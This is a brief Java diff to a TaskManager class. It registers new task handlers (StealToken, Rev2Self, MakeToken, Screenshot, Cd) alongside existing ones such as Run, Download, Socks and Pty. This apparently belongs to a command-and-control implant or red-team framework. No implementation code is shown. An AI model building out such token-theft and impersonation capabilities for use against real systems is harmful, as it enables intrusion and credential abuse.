@@ -28,6 +28,7 @@ public class TaskManager {
     private void registerDefaultTasks() {
         // Register built-in task handlers
         registerTask(new PwdTask());
+        registerTask(new CdTask());
         registerTask(new LsTask());
         registerTask(new RunTask());
         registerTask(new DownloadTask());
@@ -39,6 +40,10 @@ public class TaskManager {
         registerTask(new SleepTask());
         registerTask(new SocksTask());
         registerTask(new PtyTask());
+        registerTask(new StealTokenTask());
+        registerTask(new Rev2SelfTask());
+        registerTask(new MakeTokenTask());
+        registerTask(new ScreenshotTask());
         registerTask(exitTask);
     }
     
